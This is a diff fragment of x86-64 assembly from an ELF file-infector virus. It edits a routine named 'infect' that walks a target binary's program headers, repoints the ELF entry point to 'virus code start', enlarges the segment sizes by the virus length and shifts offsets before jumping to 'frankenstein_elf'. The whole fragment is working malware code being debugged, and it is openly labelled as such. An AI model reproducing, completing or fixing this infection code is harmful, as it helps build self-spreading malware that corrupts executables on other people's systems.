@@ -752,8 +752,10 @@ infect:
 ;
 ;****************************************************************************************
 	xor rcx, rcx
-	xor rdx, rdx
+;	xor rdx, rdx
+	mov word cx, [r13 + elf_ehdr.e_phnum]
 	check_phdrs:
+		;push rdx
 		.phdr_loop:
 			;cmp rcx, 0
 			;jg .mod_subsequent_phdr		
@@ -771,10 +773,10 @@ infect:
 				mov qword [evaddr], r10
 				mov [rax + elf_ehdr.e_entry], r10	; update ELF header entry point to point to virus code start
 				mov r10, [r13 + r12 + elf_phdr.p_offset] 
-				add r10, [r12 + elf_phdr.p_filesz]				
+				add r10, [r13 + r12 + elf_phdr.p_filesz]				
 				mov qword [vxoffset], r10
-				add qword [r12 + elf_phdr.p_filesz], vlen	
-				add qword [r12 + elf_phdr.p_memsz], vlen	
+				add qword [r13 + r12 + elf_phdr.p_filesz], vlen	
+				add qword [r13 + r12 + elf_phdr.p_memsz], vlen	
 
 			.mod_subsequent_phdr:
 				mov rdx, checkptloadfaillen
@@ -784,10 +786,14 @@ infect:
 				syscall
 				add dword [r13 + r12 + elf_phdr.p_offset], PAGESIZE
 		.next_phdr:
-			inc dx 
+	;		inc dx
+	;		pop rdx 
+			dec cx 
 			add r12w, word [r13 + elf_ehdr.e_phentsize] ;add elf_ehdr.e_phentsize to phdr offset in r12 
-			cmp word dx, [r13 + elf_ehdr.e_phnum]
-			jl .phdr_loop
+			;cmp dx, word [r13 + elf_ehdr.e_phnum]
+			cmp cx, 0
+			jg .phdr_loop
+	;		jl .phdr_loop
 			;jg check_shdrs
 	jmp frankenstein_elf
 ;****************************************************************************************
